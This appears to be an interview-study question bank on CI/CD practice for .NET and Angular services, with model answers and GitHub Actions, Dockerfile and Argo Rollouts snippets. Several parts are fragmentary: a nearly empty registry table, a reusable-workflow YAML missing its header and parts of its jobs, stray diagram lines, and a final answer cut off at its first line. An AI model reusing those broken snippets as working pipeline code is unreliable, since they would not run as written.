questions.q: Continuous integration, continuous delivery and continuous deployment: what must be true of the codebase and pipeline for each to be real rather than a label?
questions.a:
| Practice | Definition | What must be true |
|---|---|---|
| **Continuous integration** | everyone merges to mainline at least daily; every merge is built and tested automatically | short-lived branches, fast reliable pipeline (under about 10 minutes), broken main fixed immediately |
| **Continuous delivery** | every change on main is **releasable** at any time; release is a business decision | automated tests you trust, deployable artifact per commit, automated deployment to production-like environments, push-button production release |
| **Continuous deployment** | every change that passes the pipeline goes to production automatically | all of the above plus progressive delivery, automated rollback, monitoring good enough to detect regressions, feature flags to decouple deploy from release |

### Common fakes
- "CI" with long-lived feature branches merged weekly: integration still happens late.
- "CD" where production deploys need a manual runbook and a weekend.
- Continuous deployment without automated rollback or observability.

### Key distinction
**Deploy** (code reaches production) vs **release** (users see the feature). Feature flags let you deploy continuously and release deliberately.

questions.q: Trunk-based development vs GitFlow: compare their mechanics and failure modes. How do you ship incomplete features with trunk-based development?
questions.a:
### GitFlow
Long-lived {{develop}} and {{main}}, feature branches, release branches, hotfix branches. Designed for scheduled, versioned releases (installed software).
- Failure modes: late integration, merge hell, release branches stabilising for weeks, hotfixes forgotten in develop.

### Trunk-based development
Everyone commits to **main** directly or via short-lived branches (hours to a day or two) with PR review; main is always releasable.
- Failure modes: broken main if the pipeline is weak; incomplete work leaking to users if not hidden.

### Shipping incomplete work
- **Feature flags**: code merged but disabled; enabled per environment, cohort or percentage.
- **Branch by abstraction**: introduce an interface, build the new implementation behind it, switch when ready.
- **Dark launching**: run the new path in the background without exposing results.
- **Keystone interface**: build backend pieces first; the UI entry point (the keystone) is added last.

### When GitFlow-like branching still fits
Mobile apps or on-premise software with multiple supported versions: use release branches cut from main (release-flow), with fixes on main cherry-picked to release branches.
pts: GitFlow suits scheduled versioned releases; causes late integration.
Trunk-based: short-lived branches, main always releasable.
Feature flags, branch by abstraction, dark launches hide incomplete work.
Release branches cut from main for multi-version products.
Strong pipelines are required for trunk-based.
questions.ex: A payments team on GitFlow spent the last week of each month stabilising a release branch. After switching to trunk-based with flags, they deployed daily, and the month-end stabilisation week disappeared.

questions.q: Design the stage order for a .NET service pipeline. Why does "fail fast" ordering matter, and what belongs in PR builds vs main builds?
questions.a:
### Stage order (cheapest, most likely to fail first)
1. **Restore and compile** (with warnings as errors on analyzers you care about).
2. **Format and lint** ({{dotnet format --verify-no-changes}}, analyzers).
3. **Unit tests** (seconds to a couple of minutes).
4. **Security scans that are fast**: secret scanning, dependency vulnerabilities.
5. **Integration tests** with Testcontainers (minutes), contract tests.
6. **Package**: container image build, SBOM, signing.
7. **Deploy to an ephemeral or dev environment**, smoke and API tests.
8. **Slower suites**: end-to-end, performance smoke, DAST (often on main or nightly).

### Why fail fast
Developer feedback time drives behaviour: a pipeline that fails after 25 minutes for a formatting issue trains people to batch changes and ignore CI. Parallelise independent stages after the cheap gate.

### PR vs main
| PR builds | Main builds |
|---|---|
| compile, lint, unit, integration, contract, scans | same plus artifact publication |
| no secrets for production; forks get no secrets | signed artifacts, provenance |
| ephemeral preview environment (optional) | deploy to staging, then production per policy |
| required status checks to merge | failure pages the team: main must be green |

~~~yaml
      - run: dotnet restore --locked-mode

      - run: dotnet list package --vulnerable --include-transitive | tee vuln.txt; ! grep -q "has the following vulnerable packages" vuln.txt
~~~

questions.q: Why "build once, deploy many"? What goes wrong when each environment rebuilds, and how do you handle environment-specific configuration?
questions.a:
### Principle
Build an **immutable artifact** (container image by digest, NuGet package, zipped SPA) once per commit; promote the same artifact through dev, staging and production. Only configuration changes between environments.

### What goes wrong with rebuilds
- Different dependency versions resolved at different times (floating versions, mutable base images).
- Different compiler or SDK versions on different agents.
- What you tested is not what you shipped: production defects that never appeared in staging.
- Audit gap: you can't prove the production binary is the one that passed tests.

### Configuration
- **Runtime configuration** from environment variables, mounted files, Azure App Configuration or Key Vault, Kubernetes ConfigMaps and Secrets.
- No environment-specific builds ({{#if PROD}}), no config baked into images.
- For SPAs: load {{config.json}} at runtime instead of compile-time environment files (q17).

### Traceability
Tag images with the commit SHA and semantic version, deploy by **digest**, record which digest is in each environment.


questions.q: Map the test pyramid to pipeline stages for a .NET microservice with an Angular front end. What runs on every PR, on main, and nightly?
questions.a:
### Layers
| Layer | Scope | Speed | Where |
|---|---|---|---|
| Unit | domain logic, pure functions, components (Jest or Karma for Angular) | ms | every PR |
| Integration | service with real DB and broker (Testcontainers), API tests via WebApplicationFactory | seconds | every PR |
| Contract | consumer-driven contracts (Pact) or schema compatibility for events | seconds | every PR, plus provider verification |
| Component / API end to end | service deployed to an ephemeral environment with stubs | minutes | main, optionally PR |
| UI end to end | Playwright against a deployed stack, critical journeys only | minutes | main and nightly |
| Performance | smoke on main; full load tests | minutes to hours | main (smoke), nightly or weekly (full) |
| Security | SAST, dependency, secrets on PR; DAST nightly | varies | PR and nightly |

### Principles
Most confidence per minute comes from unit and integration tests with real infrastructure. End-to-end tests are few, cover the critical journeys (login, pay, statement), and are owned by the team, not a separate QA group. Anything flaky is fixed or quarantined, never ignored.
pts: Unit and integration tests on every PR.
Contract tests protect service boundaries.
Few end-to-end tests for critical journeys.
Performance smoke on main; full load nightly.
Flaky tests are fixed or quarantined.

questions.q: Explain the GitHub Actions model (workflows, triggers, jobs, steps, runners, contexts) and the security-relevant defaults you should change on day one.
questions.a:
### Model
- **Workflow**: YAML in {{.github/workflows}}; triggered by events ({{push}}, {{pull_request}}, {{workflow_dispatch}}, {{schedule}}, {{release}}).
- **Jobs**: run in parallel by default on **runners** (GitHub-hosted or self-hosted); {{needs}} creates dependencies; outputs pass data between jobs.
- **Steps**: shell commands or **actions** (reusable units from the marketplace or your org).
- **Contexts and expressions**: {{github}}, {{env}}, {{secrets}}, {{needs}}, {{matrix}} accessed with the expression syntax.
- **Environments**: named deployment targets with protection rules (reviewers, wait timers, branch restrictions) and environment-scoped secrets.

### Day-one security changes
| Default | Change |
|---|---|
| {{GITHUB_TOKEN}} permissions broad (legacy repos) | set {{permissions: contents: read}} at workflow level; grant more per job |
| actions referenced by tag ({{@v4}}) | pin third-party actions to a full commit SHA |
| any action allowed | allow-list actions at the org level |
| long-lived cloud secrets | OIDC federation to Azure, AWS, GCP |
| fork PRs | no secrets; never check out fork code in {{pull_request_target}} with secrets |
| self-hosted runners on public repos | never; use ephemeral runners |

questions.q: Speed up builds with caching (NuGet, npm, Docker layers) without breaking correctness. Why did a cache once let a build pass with an outdated dependency?
questions.a:
### What to cache
| Cache | Key | Notes |
|---|---|---|
| NuGet packages ({{~/.nuget/packages}}) | hash of {{packages.lock.json}} files | requires lock files; restore with {{--locked-mode}} |
| npm ({{~/.npm}}) | hash of {{package-lock.json}} | use {{npm ci}}, never {{npm install}} in CI |
| Docker layers | BuildKit cache (registry or GitHub Actions cache backend) | order Dockerfile so dependency restore is before source copy |
| Build outputs | rarely; incremental builds across machines are fragile | prefer remote caches only with hermetic build systems |

### How caches break correctness
- Key not derived from **everything** that affects the result (lock files, SDK version, OS): stale content restored.
- Restoring a cache of **build outputs** that should have been rebuilt.
- Floating versions ({{1.*}}) resolved once and cached, so a vulnerable version stays while CI reports green, or the opposite: the cache hides that a newer resolution breaks.
- Fallback keys ({{restore-keys}}) restoring a near-match cache that contains old packages, with restore not re-validating.

### Rule
Cache **inputs** (downloaded packages) keyed on lock files, not **outputs**; make restore deterministic ({{--locked-mode}}, {{npm ci}}); periodically run a cold build.

~~~yaml
- uses: actions/setup-dotnet@v4
  with:
    dotnet-version: 9.0.x
    cache: true
    cache-dependency-path: "**/packages.lock.json"     # key includes every lock file
- run: dotnet restore --locked-mode                    # fails if lock file and project disagree

- uses: actions/setup-node@v4
  with: { node-version: 22, cache: npm, cache-dependency-path: web/package-lock.json }
- run: npm ci --prefix web

- uses: docker/build-push-action@v6
  with:
    context: .
    cache-from: type=gha,scope=payments-api
    cache-to: type=gha,mode=max,scope=payments-api
# Dockerfile: COPY *.csproj and restore first, then COPY src, so restore layer is reused
~~~
pts: Cache inputs keyed on lock files, not outputs.
Lock files plus locked-mode restore and npm ci.
Order Dockerfiles for layer reuse.

questions.q: A test suite takes 35 minutes. How do you parallelise it with matrices and sharding while keeping results reliable?
questions.a:
### Techniques
| Technique | How |
|---|---|
| **Split by project** | unit, integration, contract as parallel jobs |
| **Matrix** | OS, runtime versions, or test categories as matrix dimensions |
| **Sharding** | divide tests into N shards by timing data (balanced) rather than alphabetically |
| **In-process parallelism** | xUnit collections run in parallel; isolate shared state |
| **Test impact analysis** | run only tests affected by changed code on PRs; full suite on main |

### Reliability concerns
- Shared resources (one database, fixed ports) cause interference: give each shard its own containers (Testcontainers) or database names.
- Order-dependent tests surface when parallelised: fix them, they were already bugs.
- Aggregating results: upload test reports from each shard and merge (JUnit or TRX) so failures are visible in one place.
- Cost: more runners in parallel; measure cost vs time saved.

### Targets
PR feedback under 10 minutes; main pipeline to deployable artifact under 20.
questions.code:
~~~yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: 9.0.x }
      - name: Run shard
        run: |
          dotnet test tests/Integration -c Release --list-tests | grep "    " | sed 's/^ *//' > all.txt
          split -n r/4 all.txt shard_                              # round-robin split; prefer timing-based in practice
          FILTER=$(sed -n 's/.*/FullyQualifiedName=&/p' shard_$(printf '%02d' $(( $\{{ matrix.shard }} - 1 ))) | paste -sd '|' -)
          dotnet test tests/Integration -c Release --filter "$FILTER" --logger "trx;LogFileName=shard$\{{ matrix.shard }}.trx"
      - uses: actions/upload-artifact@v4
        if: always()
        with: { name: trx-$\{{ matrix.shard }}, path: "**/*.trx" }
~~~

Isolate resources per shard.

questions.q: Monorepo or polyrepo for 30 .NET microservices and two Angular apps? Compare and explain how CI works in each.
questions.a:
| Aspect | Monorepo | Polyrepo |
|---|---|---|
| Cross-cutting changes | one atomic PR | coordinated PRs across repos |
| Shared libraries | project references, always latest | published packages with versions |
| CI | must build only **affected** projects; path filters or build graph tools | simple per repo |
| Ownership | CODEOWNERS per folder | repo-level permissions |
| Tooling scale | needs care beyond a few hundred projects (git performance, build graph) | scales by default |
| Dependency drift | central package management keeps versions aligned | drift across repos |
| Independent deploys | possible, but needs discipline | natural |

### CI in a monorepo
- Path filters per service ({{paths: services/payments/**}}) plus shared folders that trigger dependants.
- Or a build graph: compute affected projects from the dependency graph (dotnet-affected, Nx for Angular).
- Central package management ({{Directory.Packages.props}}) and shared build props.

### Recommendation
For 30 services in one domain with shared contracts and one or two teams of teams: monorepo with affected builds and CODEOWNERS works well. For many independent teams or separate compliance boundaries: polyrepo with versioned shared packages and a template for pipelines.
questions.code:
~~~yaml
# Monorepo: build only what changed, including dependants of shared libraries
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      projects: $\{{ steps.affected.outputs.projects }}
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - id: affected
        run: |
          dotnet tool restore
          dotnet affected --from origin/main --to HEAD --format json > affected.json   # graph-based
          echo "projects=$(jq -c '[.[].Name]' affected.json)" >> "$GITHUB_OUTPUT"
  build:
    needs: changes
    if: needs.changes.outputs.projects != '[]'
    strategy:
      matrix:
        project: $\{{ fromJson(needs.changes.outputs.projects) }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: dotnet test "$\{{ matrix.project }}" -c Release
~~~
pts: Monorepo: atomic changes, aligned versions, needs affected builds.
Polyrepo: simple CI, versioned packages, drift risk.
Path filters or dependency graphs for monorepo CI.
Central package management.
Choose by team structure and boundaries.
questions.ex: A company with 30 polyrepos spent a sprint updating a shared contract package across all repos for one field. Moving the domain's services into a monorepo with affected builds made such changes a single PR, while independent deploys continued.

questions.q: Flaky tests are eroding trust in CI. How do you detect, triage and eliminate them systematically?
questions.a:
### Why it matters
A 2% flaky rate across 500 tests means most pipeline runs fail spuriously; people re-run until green and stop reading failures, so real failures get merged.

### Detect
- Track per-test pass/fail history across runs (test reporting tools, or upload results to a database).
- A test that fails and then passes on retry for the same commit is flaky by definition.
- Nightly reruns of the suite (for example 10 times) surface low-rate flakes.

### Triage
Common causes: time and time zones ({{DateTime.Now}}), ordering assumptions, shared state between tests, async waits with fixed sleeps, real network calls, port conflicts, random data without seeds, resource limits on runners.

### Policy
1. **Quarantine** within a day: move the test to a non-blocking category with an owner and a ticket.
2. **Fix or delete** within an SLA (for example two weeks).
3. Automatic retries only as a temporary measure and always reported (retry count visible).
4. Track flaky rate as a team metric.
pts: Flakes destroy trust and hide real failures.
Detect via per-test history and reruns.
Common causes: time, order, shared state, sleeps, network.
Quarantine fast with owner and SLA.
Retries are temporary and visible.
questions.ex: A team's main pipeline was red 30% of the time from flakes and people merged on red. A flaky-test dashboard, one-day quarantine rule and a two-week fix SLA brought spurious failures under 1% in a quarter.

questions.q: What quality gates belong in the pipeline? Is "80% code coverage" a good gate, and what would you use instead or in addition?
questions.a:
### Coverage as a gate
Line coverage measures what was **executed**, not what was **verified**. Teams under an 80% mandate write assertion-free tests or test getters. A global threshold also punishes legacy code and rewards trivial code.

### Better gates
| Gate | Why |
|---|---|
| **Coverage on new or changed code** (diff coverage, for example 80% of changed lines) | focuses on the change, not legacy |
| **No coverage decrease** on critical modules (payments rules, pricing) | protects what matters |
| **Mutation testing** on critical domain code (Stryker.NET) on a schedule | measures whether tests detect injected bugs |
| Static analysis: analyzers with warnings as errors, security rules (SAST) | catches classes of bugs cheaply |
| Dependency vulnerabilities above a severity threshold | supply chain |
| Contract compatibility (OpenAPI diff, schema registry) | prevents breaking consumers |
| Required reviews and status checks (branch protection) | process controls |

### Principles
Gates must be **fast, deterministic and actionable**; each failure message should say what to do. Non-blocking signals (dashboards) are fine for trends.
questions.code:
~~~yaml
- name: Test with coverage
  run: dotnet test -c Release --collect:"XPlat Code Coverage" --results-directory ./coverage
- name: Diff coverage gate (changed lines only)
  run: |
    dotnet tool run reportgenerator -reports:"coverage/**/coverage.cobertura.xml" -targetdir:cov -reporttypes:Cobertura
    pipx run diff-cover cov/Cobertura.xml --compare-branch=origin/main --fail-under=80
- name: Mutation testing for the pricing domain (nightly)
  if: github.event_name == 'schedule'
  run: dotnet stryker --project Pricing.Domain.csproj --break-at 70 --reporter html --reporter dashboard
~~~
pts: Global coverage targets get gamed.
Diff coverage on changed lines.
Mutation testing for critical domain code.

questions.q: EF Core InMemory provider, SQLite, or a real database in tests? When are test doubles appropriate, and when do they create false confidence?
questions.a:
### InMemory provider problems
It is not a relational database: no transactions, no constraints (unique, foreign keys), no SQL translation (queries that fail in SQL Server pass), different concurrency behaviour, case sensitivity differences. Microsoft discourages it for testing.

### SQLite
Closer (relational, constraints) but a different SQL dialect: features like {{datetimeoffset}} ordering, JSON functions, row versioning and some translations differ.

### Real database via Testcontainers
Same engine and version as production; migrations exercised; seconds to start (reuse containers per test class or collection; use Respawn to reset data). Best default for repository and integration tests.

### Test doubles still fit
| Use doubles for | Use real dependencies for |
|---|---|
| external third parties (payment provider, email) via fakes or WireMock | your database |
| time ({{TimeProvider}}), randomness | your message broker for integration flows |
| slow or non-deterministic systems | serialisation and contracts |
| unit tests of domain logic (no I/O at all) | migrations |

### False confidence
Mocking your own repository and asserting it was called proves nothing about the query; mocks that encode wrong assumptions about third-party behaviour need contract tests or sandbox checks.
pts: InMemory provider lacks constraints, transactions and SQL translation.
SQLite differs in dialect and features.
Testcontainers gives the real engine with migrations.
Double external third parties, time and randomness.
Don't mock your own repositories to test queries.

questions.q: How do you version and store build artifacts (container images, NuGet packages, SPA bundles)? Cover SemVer, commit traceability, registries and retention.
questions.a:
### Versioning
- **Libraries (NuGet)**: Semantic Versioning; breaking changes bump major; tools like GitVersion or MinVer derive versions from tags and commits; pre-release suffixes for main builds ({{2.4.0-ci.187}}).
- **Services**: SemVer is less meaningful for deployables; use a build version ({{2026.10.13.4}} or {{1.42.0}}) plus the **commit SHA**, and deploy by **digest**.
- Embed version and SHA in the artifact (assembly informational version, image labels per OCI spec) and expose via {{/info}} endpoint.

### Registries
| Artifact | Registry |
|---|---|

| SPA bundles | versioned blobs or images |

### Retention
Keep everything deployed to production for the audit period; expire CI-only builds after N days; never delete an artifact referenced by a running environment. Immutable tags (registry setting) to prevent overwriting.

questions.q: What makes a build reproducible, and why does it matter for security and incident response? How do you achieve it for .NET and Node?
questions.a:
### Definition
Given the same source revision, anyone can rebuild an artifact that is identical (or verifiably equivalent) to the one shipped.

### Why it matters
- **Security**: detect tampering in the build system (rebuild and compare); a core idea behind SLSA.
- **Incident response**: rebuild an old version exactly to debug or patch.
- **Audit**: prove what was shipped.

### Ingredients
| Ingredient | .NET | Node/Angular |
|---|---|---|
| Pinned dependencies | {{packages.lock.json}}, central package management, {{--locked-mode}} | {{package-lock.json}}, {{npm ci}} |
| Pinned toolchain | {{global.json}} SDK version with rollForward policy | {{.nvmrc}} or engines, pinned Angular CLI |
| Pinned base images | image digests, not tags | same |
| Deterministic compiler output | {{Deterministic}}, {{ContinuousIntegrationBuild}}, path mapping | build without timestamps where possible |
| Hermetic builds | no network during build except package restore from a controlled feed | same |
| Recorded provenance | build metadata, SBOM, attestation | same |

~~~dockerfile
WORKDIR /src
COPY global.json Directory.Packages.props NuGet.config ./
COPY src/Payments.Api/*.csproj src/Payments.Api/packages.lock.json src/Payments.Api/
RUN dotnet restore src/Payments.Api --locked-mode
COPY src/ src/
RUN dotnet publish src/Payments.Api -c Release -o /out -p:ContinuousIntegrationBuild=true
~~~

questions.q: Design environment promotion from dev to production with gates. Which gates are automated, which are human, and how do you avoid approvals becoming rubber stamps?
questions.a:
### Flow
dev (every main commit) then staging (automated after dev checks) then production (policy-driven). Optional pre-production with production-like data volumes for performance.

### Gates
| Gate | Type |
|---|---|
| tests passed, artifact signed, vulnerability thresholds met | automated |
| smoke tests and synthetic checks in staging | automated |
| SLO health of staging during soak (error rate, latency) | automated |
| change window or freeze calendar | automated policy |
| no active incident in production | automated (query incident tool) |
| human approval | only where policy demands (high-risk changes, regulated systems), with context |

### Avoiding rubber stamps
- Approvers see **what changed** (commits, linked tickets, risk classification, test results) in the approval request.
- Risk-based: low-risk changes (config, small fixes) flow automatically; high-risk ones (schema changes, auth changes) require review.
- Track approval latency and post-incident whether approvals caught anything.
- Separation of duties enforced by tooling (author cannot approve their own production deployment).
questions.code:
~~~yaml
jobs:
  deploy-staging:
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh staging $\{{ needs.build.outputs.digest }}
      - run: ./smoke.sh https://staging.payments.bank.internal
  soak-check:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - run: sleep 900                                    # 15 min soak
      - run: ./slo-check.sh --env staging --max-error-rate 0.5 --max-p99-ms 400
      - run: ./no-active-incident.sh --service payments
  deploy-prod:
    needs: soak-check
    environment:
      name: production                                    # protection rules: required reviewers for high-risk, branch = main
      url: https://payments.bank.example
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh production $\{{ needs.build.outputs.digest }} --strategy canary
~~~
pts: Automate most gates: tests, signatures, scans, smoke, SLO soak.
Policy gates: change windows, active incidents.
Human approvals only where risk or policy requires.
Give approvers context; risk-classify changes.
Enforce separation of duties in tooling.
questions.ex: A bank required two manual approvals for every deploy; approvals averaged 2 days and an audit showed approvers rejected 0.3% of changes, none of which would have caused incidents. Risk-based automation kept human approval for 15% of changes and cut lead time from 5 days to 4 hours.

pit: Every change treated as high risk.

questions.q: How do you run database migrations in the pipeline safely for a service deployed with rolling updates? Cover EF Core migration bundles and expand-contract.
questions.a:
### Problem
During a rolling update, old and new versions run simultaneously against the same database. A migration that drops or renames a column breaks the old version mid-rollout; migrations run from app startup race across replicas.

### Pipeline approach
1. Generate **idempotent scripts** or an **EF Core migration bundle** ({{dotnet ef migrations bundle}}) as a build artifact.
2. Run migrations as a **separate pipeline step** (or Kubernetes Job) before deploying the new app version, with a dedicated identity that has DDL rights (the app identity doesn't).
3. Review the generated SQL in the PR (risky operations flagged).

### Expand and contract
| Release | Change |
|---|---|
| 1 (expand) | add new nullable column or new table; app writes both old and new |
| 2 (migrate) | backfill in batches; app reads new, still writes both |
| 3 (contract) | app stops using old column |
| 4 | drop old column |
Every step is backward compatible with the previous app version, so rollback of the app is always safe.

### Dangerous operations
Adding NOT NULL columns with defaults on huge tables, index builds without ONLINE, column type changes, large updates in one transaction: all need special handling.
questions.code:
~~~yaml
jobs:
  build:
    steps:
      - run: dotnet tool restore
      - run: dotnet ef migrations bundle -p src/Payments.Infrastructure -s src/Payments.Api -o out/efbundle --self-contained -r linux-x64
      - run: dotnet ef migrations script --idempotent -p src/Payments.Infrastructure -s src/Payments.Api -o out/migrations.sql
      - uses: actions/upload-artifact@v4
        with: { name: migrations, path: out/ }
  migrate-prod:
    needs: [build, deploy-staging]
    environment: production-db                     # separate approval for schema changes
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: { name: migrations }
      - uses: azure/login@v2
        with: { client-id: "$\{{ vars.MIGRATOR_CLIENT_ID }}", tenant-id: "$\{{ vars.TENANT_ID }}", subscription-id: "$\{{ vars.SUB_ID }}" }
      - run: ./efbundle --connection "$\{{ secrets.PAYMENTS_DB_MIGRATOR }}"
  deploy-prod:
    needs: migrate-prod
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh production
~~~
pts: Old and new versions share the database during rollouts.
Migrations as a separate step with a DDL identity.
EF migration bundles or idempotent scripts as artifacts.
Expand-contract keeps every step backward compatible.
Special handling for dangerous operations.
questions.ex: A migration renamed a column at app startup; during a rolling update the old pods failed every query for 6 minutes. Moving to expand-contract with migrations as a separate job meant the next rename shipped across four releases with zero errors.

questions.q: Build-once-deploy-many for an Angular or React SPA: how do you avoid per-environment builds, and how do you deploy SPAs safely (caching, versioning, rollback)?
questions.a:
### The per-environment build trap
Angular {{environment.prod.ts}} files and React {{process.env}} values are baked in at build time, so teams build once per environment, breaking build-once.

### Runtime configuration
- Serve a {{config.json}} (or {{/config}} endpoint) per environment; load it before bootstrapping (Angular {{APP_INITIALIZER}} or {{provideAppInitializer}}; React fetch before render).
- Config contains only **public** values (API base URLs, client ids, feature flags); never secrets.

### Deployment
- Content-hashed file names ({{main.3f9a1c.js}}) cached for a year (immutable); {{index.html}} and {{config.json}} served with {{no-cache}}.
- Upload new assets **before** switching {{index.html}}, so users with the old index can still load old chunks; keep previous versions' assets for a while (lazy-loaded chunks).
- Rollback = point {{index.html}} back to the previous version.
- Version endpoint or meta tag so support can see which version a user runs; prompt reload on new versions for long-lived sessions.
pts: Build-time environment files break build-once.
Load public config at runtime before bootstrap.
Hashed assets immutable; index and config no-cache.
Upload assets before switching index; keep old chunks.
Rollback by switching index.
questions.ex: A bank's web app was built three times per release with different environment files; a production-only build missed a feature flag and exposed an unfinished screen. Runtime config.json with build-once fixed it, and rollbacks became a 10-second index switch.

questions.q: Thirty repositories each have a slightly different pipeline. How do you standardise with reusable workflows or templates without blocking teams?
questions.a:
### Mechanisms
| Mechanism | Use |
|---|---|
| **Reusable workflows** ({{workflow_call}}) | whole pipelines: build-test-publish for a .NET service, with inputs |
| **Composite actions** | reusable steps: setup, scanning, deploy |
| Azure DevOps **templates** ({{extends}}) | same idea; {{extends}} templates can enforce required steps |
| Required workflows / rulesets | org-level enforcement that certain checks run |
| Starter workflows | scaffolding for new repos |

### Design
- Versioned (tags) so teams upgrade deliberately; Renovate PRs propose upgrades.
- Inputs for legitimate variation (solution path, test projects, deploy target); escape hatches via extra steps before or after.
- Mandatory controls (scanning, signing, SBOM) inside the reusable workflow, not optional.
- Documentation and a changelog.

### Governance
Platform team owns the templates; teams contribute via pull requests; adoption tracked on a dashboard. Avoid forcing a single pipeline on every repo type; offer templates per archetype (service, library, SPA, infrastructure).

~~~yaml
# Org template repo: .github/workflows/dotnet-service.yml

      run-integration-tests: { type: boolean, default: true }
    outputs:
      digest: { value: "$\{{ jobs.publish.outputs.digest }}" }

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: bank/actions/setup-dotnet@v3
      - run: dotnet test "$\{{ inputs.solution }}" -c Release

    outputs: { digest: "$\{{ steps.img.outputs.digest }}" }

    with: { solution: Payments.sln, image-name: payments-api }
~~~

Inputs for variation; mandatory controls inside.

questions.q: Compare canary, blue-green, rolling and ring deployments. Design progressive delivery for a payments API with automated analysis.
questions.a:
| Strategy | How | Pros | Cons |
|---|---|---|---|
| **Rolling** | replace pods gradually | simple, default in Kubernetes | mixed versions, slow rollback, no traffic control |
| **Blue-green** | full new environment, switch traffic | instant switch and rollback | double capacity, database must work for both |
| **Canary** | small traffic share to new version, increase with analysis | limits blast radius, real traffic validation | needs traffic splitting and good metrics |
| **Rings** | deploy to groups: internal users, a region, a tenant cohort, everyone | business-meaningful blast radius | slower overall rollout |

### Payments API design
1. Deploy canary (Argo Rollouts or Flagger) at 5% of traffic, keyed by stable customer hash.
2. Analysis every minute for 10 minutes: HTTP 5xx rate, p99 latency, and **business metrics**: payment success rate, scheme rejection rate, compared with baseline.
3. Steps: 5%, 25%, 50%, 100%, with pauses.
4. Automatic abort and rollback on failed analysis; page the team.
5. Ring by region afterwards: EU West, then EU North.

### Prerequisites
Backward-compatible database and event changes, version-tagged metrics, enough traffic for statistical confidence (or longer windows at low traffic).
questions.code:
~~~yaml
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata: { name: payments-api, namespace: payments }
spec:
  strategy:
    canary:
      canaryService: payments-api-canary
      stableService: payments-api-stable
      trafficRouting: { istio: { virtualService: { name: payments-api, routes: [primary] } } }
      steps:
      - setWeight: 5
      - analysis: { templates: [{ templateName: payments-health }] }
      - setWeight: 25
      - pause: { duration: 10m }
      - setWeight: 50
      - analysis: { templates: [{ templateName: payments-health }] }
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata: { name: payments-health, namespace: payments }
spec:
  metrics:
  - name: payment-success-rate
    interval: 1m
    count: 10
    successCondition: result[0] >= 0.985
    failureLimit: 2
    provider:
      prometheus:
        address: http://prometheus.monitoring:9090
        query: sum(rate(payments_completed_total{version="canary",outcome="success"}[2m])) / sum(rate(payments_completed_total{version="canary"}[2m]))
~~~
pts: Rolling: simple; blue-green: instant switch; canary: real-traffic validation; rings: business blast radius.
Analyse technical and business metrics.
Automatic abort and rollback.
Stable cohort hashing.
Backward-compatible data changes required.

questions.q: How do you make rollback safe? When do you roll back and when do you roll forward, and how do database and event changes constrain the choice?
questions.a:
### Rollback is only safe if
- The previous artifact is still available and deployable by digest.
- **Data changes are backward compatible**: the previous version can read what the new version wrote (expand-contract, additive events).
- Configuration and feature flags are versioned with the deploy, or independent.
- External side effects (messages published in a new format) are consumable by everyone.

### Decide
| Situation | Action |
|---|---|
| clear regression, previous version compatible | **roll back** immediately (minutes) |
| problem in a flagged feature | **turn off the flag** (fastest) |
| the new version wrote data the old can't read | **roll forward** with a fix (or a compatibility patch) |
| security fix shipped | roll forward; don't reintroduce the vulnerability |

### Practices
- Rollback is a one-click (or automated) pipeline action, rehearsed regularly.
- Migrations are forward-only and compatible; down migrations are rarely safe for data.
- Event schemas versioned so consumers of the old version keep working.
- Post-rollback: incident review and a test that would have caught it.
questions.code:
~~~yaml
# One-click rollback workflow: redeploy the previous known-good digest
on:
  workflow_dispatch:
    inputs:
      service: { required: true, type: string }
      reason:  { required: true, type: string }
jobs:
  rollback:
    environment: production
    runs-on: ubuntu-latest
    steps:
      - name: Find previous good release
        id: prev
        run: |
          echo "digest=$(./releases.sh previous-good --service $\{{ inputs.service }})" >> "$GITHUB_OUTPUT"
      - name: Check schema compatibility
        run: ./schema-compat.sh --service $\{{ inputs.service }} --target-digest $\{{ steps.prev.outputs.digest }}   # fails if DB is past contract step
      - run: ./deploy.sh production $\{{ steps.prev.outputs.digest }} --strategy immediate
      - run: ./incident-note.sh "$\{{ inputs.service }} rolled back: $\{{ inputs.reason }}"
~~~
pts: Rollback needs previous artifacts and compatible data.
Flags are the fastest rollback.
Roll forward when data or security prevents rollback.
One-click, rehearsed rollback.
Forward-only, compatible migrations.
questions.ex: A release changed an event's amount from decimal to integer minor units; rollback reintroduced consumers that couldn't parse new events already on the topic. Since then, event changes ship as new versions published in parallel, keeping rollback safe.

What about mobile apps?
pit: Destructive migrations in the same release.

questions.q: GitOps (pull-based) vs push-based CD: compare mechanics, security and failure modes. How does a commit reach production with Argo CD?
questions.a:
### Push-based
The pipeline holds credentials to the cluster and runs {{helm upgrade}} or {{kubectl apply}}. Simple; but CI has production credentials, drift isn't detected, and the cluster state is whatever the last pipeline did.

### GitOps (pull-based)
Desired state lives in a Git repository; an agent in the cluster (Argo CD, Flux) continuously reconciles the cluster to Git.
- No cluster credentials in CI: CI only commits to the config repo (image digest bump).
- **Drift detection and self-healing**: manual changes are reverted or flagged.
- Audit trail: every production change is a Git commit with review.
- Rollback = Git revert.

### Flow with Argo CD
1. CI builds, tests, signs and pushes image; opens a PR (or commits) to the environment config repo updating the digest.
2. PR checks: policy (Kyverno CLI or conftest), diff preview.
3. Merge to the {{prod}} path or branch.
4. Argo CD detects the change, syncs (optionally with sync windows and progressive rollout via Argo Rollouts).
5. Health status reported back; notifications.

### Failure modes
Config repo becomes a bottleneck or a merge-conflict hotspot; secrets need a separate solution (External Secrets, Sealed Secrets); Argo CD itself is critical infrastructure (HA, access control); emergency changes must still go through Git.

  CFG -->|review + policy checks + merge| CFG

  ARGO -->|reconciles| K8S[Production cluster]
  K8S -->|health| ARGO

questions.q: Production is down and the fix must go out now. What is your hotfix process, and what must never be skipped even in an emergency?
questions.a:
### First: is a code fix needed?
